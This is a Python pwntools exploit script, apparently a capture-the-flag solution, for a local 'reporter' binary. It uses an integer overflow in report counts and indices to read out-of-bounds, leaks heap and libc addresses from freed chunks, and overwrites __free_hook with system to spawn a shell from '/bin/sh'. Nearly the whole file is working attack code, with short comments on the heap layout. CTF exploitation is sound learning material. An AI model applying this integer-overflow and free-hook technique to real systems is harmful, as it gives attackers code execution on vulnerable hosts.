from pwn import *

from exploit import *
p = exploit_source("./dist/reporter.o", "nc localhost 13034")

libc = ELF("./dist/libc.so.6")

def alloc(count):
    p.sendlineafter("Option", "1")
    p.sendlineafter("How many reports?", str(count))

def get(idx):
    p.sendlineafter("Option", "2")
    p.sendlineafter("Index: ", str(idx))

def set(idx, by, content):
    p.sendlineafter("Option", "3")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("By: ", by)
    p.sendafter("Content: ", content)


p.sendlineafter("How many reports?", "3")

alloc((1 << 63) + 4) # 4 in 64-bit, with MSB=1. Integer overflow

get(((1 << 64) - 3) & ((1 << 62) - 1))

p.recvuntil("):\n\t")
heap_leak = u64(p.recvuntil("\n")[:-1].ljust(8, b'\0')) - 0x10
info(f"{hex(heap_leak) = }")

alloc((1 << 63) + 20) # 20 in 64-bit, with MSB=1. Integer overflow

# after this reallocation, the old reports are freed
# and due to their size are placed into unsorted bins,
# and have their fd and bk pointers pointing to libc

alloc((1 << 63) + 40) # 40 in 64-bit, with MSB=1. Integer overflow


# -21 in 64-bit, but two-MSB bits = 0

# this ensures idx < len, but when multiplied
# by 0x40 it's basically negative indexing
# and we get the item at the -21 index
get(((1 << 64) - 21) & ((1 << 62) - 1))
# at -21 index are libc pointers of previously freed reports array chunk
p.recvuntil("by ")
main_arena_96 = u64(p.recvuntil(")")[:-1].ljust(8, b'\0'))

libc.address = main_arena_96 - 0x1ecbe0
success(f"{hex(libc.address) = }")

one_gadget = libc.symbols.system

heap_chunk = heap_leak + 2224
offset = ((libc.symbols.__free_hook - heap_chunk) // 0x38)
# change free_hook only :)
shift = libc.symbols.__free_hook - (offset * 0x38 + heap_chunk)
arr = bytearray(b"\0" * 0x38)
arr[shift: shift+8] = p64(one_gadget)

info(f"{hex(libc.symbols.__free_hook) = }")
info(f"{hex(one_gadget) = }")
set(0, b"A"*0x10, flat({0: "/bin/sh\0"}, length=0x28))
set(offset | (1 << 62), arr[0x28:], arr[:0x28])

alloc((1 << 63) + 50) # boom

p.interactive()